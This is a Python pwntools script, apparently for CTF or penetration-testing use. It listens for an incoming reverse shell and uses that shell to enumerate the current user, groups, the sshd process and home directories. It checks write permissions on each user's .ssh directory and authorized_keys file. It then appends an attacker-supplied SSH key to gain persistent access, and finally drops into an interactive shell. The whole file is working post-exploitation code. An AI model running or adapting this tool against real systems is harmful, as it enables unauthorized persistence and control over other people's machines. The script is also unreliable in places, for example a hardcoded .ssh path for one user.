import os 
import socket
import sys
import time 
from pwn import *  

# context.log_level = "DEBUG"

class Perm():
    def __init__(self,Perm):
        self.Perms = Perm
        self.OwnerPerms = Perm[0:2]
        self.GroupPerms = Perm[2:5]
        self.GenericPerms = Perm[5:8]
        self.SetNumPerms()
        
    def __repr__(self):
        return(self.NumPerm)
        
    def SetNumPerms(self):
        s = self.Perms.replace("-","0").replace("r","4").replace("w","2").replace("x","1")
        sx = "".join(list(map(str,map(sum,[(map(int,list(s[i:i+3]))) for i in range(0,len(s),3)]))))
        # * Janky one liner to get int permissions
        self.NumPerm = sx
        
        


class Item():
    def __init__(self,Perms,Owner,Group,FileSize,Name):
        self.Type = "Directory" if Perms[0] == "d" else "File"
        self.Perms = Perm(Perms[1:])
        self.Owner = Owner
        self.Group = Group
        self.fs = FileSize 
        self.Name = Name
        
    def __repr__(self):
        return(vars(self))

class User():
    def __init__(self,Name,p,CurrentUser,Groups):
        self.Name = Name
        self.CurrentUser = CurrentUser
        self.Groups = Groups
        self.p = p 
        self.SSH_Dir_Items = {}
        self.Home_Dir_Items = {}
        self.Has_SSH_Dir = self.CheckUser()
        self.EvaluateAccess()
        
    def CheckUser(self):
        L.sendline(f'[[ -d "/home/{self.Name}/.ssh/" ]] && echo "1" || echo "0"'.encode())
        L.recvline() # * Reply of Command 
        Has_SSh_Dir = bool(int(Sanitise(DefaultReply,L.recv(4048))))
        
        if Has_SSh_Dir:
            self.p.status(f".ssh Directory Found")
            self.CheckAccessRights()
        else:
            self.p.status(f".ssh Directory Not Found")
            
        return(Has_SSh_Dir)

        
    def CheckHomeDirWriteable(self):
        L.sendline(f"ls -la /home/{self.Name}/".encode())
        R()
        AccessRights = Sanitise(DefaultReply,L.recv(1024))
     
        for _ in AccessRights.split("\n")[1:]:
            x = _.split(" ")
            
            while "" in x:
                x.remove("")
                        
            if x[-1] == "..":
                pass
            
            I = Item(Perms=x[0],Owner=x[2],Group=x[3],FileSize=x[4],Name=x[-1])
            self.Home_Dir_Items.update({x[-1] : I})
        
        CanWrite = self.CanWrite(vars(self.Home_Dir_Items["."]),NameOverwrite=f"/home/{self.Name}")
        
        if CanWrite:
            self.p.status("'authorized_keys' can be created")
            
     

    def CheckAccessRights(self):
        L.sendline(b"ls -la /home/NxtDaemon/.ssh")
        R()

        AccessRights = Sanitise(DefaultReply,L.recv(1024))
        
        for _ in AccessRights.split("\n")[1:]:
            x = _.split(" ")
            
            while "" in x:
                x.remove("")
                        
            if x[-1] == "..":
                pass
            I = Item(Perms=x[0],Owner=x[2],Group=x[3],FileSize=x[4],Name=x[-1])
            self.SSH_Dir_Items.update({x[-1] : I})
    
    def EvaluateAccess(self):
        AuthKeys = self.SSH_Dir_Items.get("authorized_keys",False)
        
        if not AuthKeys:
            self.p.status("No 'authorized_keys' file exists")
            self.CheckHomeDirWriteable()
        else:
            self.p.status("'authorized_keys' file exists")
            if self.CanWrite(vars(AuthKeys)):
                self.WriteKey()
    
    def WriteKey(self):
        Key = """HOST"""
        
        L.sendline(f"echo '{Key}' >> /home/{self.Name}/.ssh/authorized_keys".encode())
        R() # * Reply of Command 
        L.clean(0.1)
        self.p.success(f"Added key to Hosts File")
    
    def CanWrite(self,File,NameOverwrite=""):
        Name = File.get("Name") if NameOverwrite == "" else NameOverwrite
        Perms = str(File.get("Perms"))
        Owner = File.get("Owner")
        Group = File.get("Group")
                        
        OwnerWritable = True if int(Perms[0]) > 4 and (Owner == self.CurrentUser) else False
        GroupWritable = True if int(Perms[1]) > 4 and Group in self.Groups else False
        WorldWriteable = True if int(Perms[2]) > 4 else False
        
        if WorldWriteable:
            self.p.status(f"'{Name}' Is World Writeable")
            return(True)
        elif GroupWritable:
            self.p.status(f"'{Name}' is Writeable Via {Group}")
            return(True)
        elif OwnerWritable:
            self.p.status(f"'{Name}' is Owner Writeable")
            return(True)
        else:
            self.p.failure(f"'{Name}' Is Not Writeable.")
            return(False)
        
        
class SSH_Infomation():
    def __init__(self):
        SSH_Enabled = None
        SSH_Running = None
        self.Users = []
        self.Groups = []
        self.CurrentUser = "UNKNOWN"
        self.GetUser()
        self.GetGroups()
        self.CheckSSH()

    def GetUser(self):
        L.sendline(b"whoami")
        R() # * Reply of Command 
        Name = Sanitise(DefaultReply,L.recv(4096))
        self.CurrentUser = Name

    def GetGroups(self):
        L.sendline(b"groups")
        R() # * Reply of Command
        Groups = Sanitise(DefaultReply,L.recv(4096)).split(" ")
        self.Groups = Groups
    
    def CheckSSH(self):
        L.sendline(b"ps aux | grep sshd")
        R() # * Reply of Command 
        Processes = Sanitise(DefaultReply,L.clean(0.1)).split("\n")
        log.info("")
        log.info("Displaying sshd Processes")
        for _ in Processes:
            log.info(f"    {_}")
            
        if len(Processes) >= 2:
            self.SSH_Running = True
            self.GetUsers()
        else:
            X = None
            while X == None:
                try:
                    Response = input("Do you want to attempt AutoSSh Anyway? [Y/N] > ").upper()
                    if not Response in ["Y","N"]:
                        raise("Not Correct Response")
                    X = True if Response == "Y" else False
                    
                    if X:
                        self.GetUsers()
                    
                except:
                    pass
            
    def GetUsers(self):
        L.sendline(b"ls /home")
        R() # * Reply Of Command 
        Contents = Sanitise(DefaultReply,L.recv(4096))
        Users = Contents.split("\n")
        
        for _ in Users:
            log.info("")
            log.info(f"Found User : {_}")
            p = log.progress(f"{_}")
            UserF = User(_,p,self.CurrentUser,self.Groups)
            self.Users.append(UserF)
            
        return Users

def R():
     return(L.recv(1024))
 
def Sanitise(DefaultReply,String : str):
    if isinstance(String, bytes):
        String = String.decode()    
    
    String = String.strip().replace(DefaultReply,"")
    return String.strip()

        
    

# * Setup Listener Shell
L = listen(2000)
print(f"Listening On 0.0.0.0:{L.lport}")
DefaultReply = R().decode().strip()
X = SSH_Infomation()

try:
    Choice = input("Do you want to go interactive? (Enter anything to go interactive or ctrl-c to exit) > ")
    L.interactive()
except KeyboardInterrupt:
    print("\n")
    exit()

